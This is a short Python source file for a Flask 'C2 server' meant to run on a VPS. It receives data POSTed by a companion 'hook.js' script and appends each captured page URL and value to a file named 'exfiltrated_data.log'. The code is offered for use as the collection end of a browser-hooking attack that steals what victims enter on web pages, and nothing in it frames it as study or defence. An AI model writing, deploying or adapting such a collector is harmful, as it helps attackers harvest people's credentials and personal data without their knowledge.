# Simple Flask C2 server that runs on a VPS (or your machine!) and listens for incoming data from the hook.js script
from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("exfiltrated_data.log", "a") as f:
        f.write(f"[{timestamp}] URL: {data.get('url')} | Data: {data.get('value')}\n")
    
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(port=5000)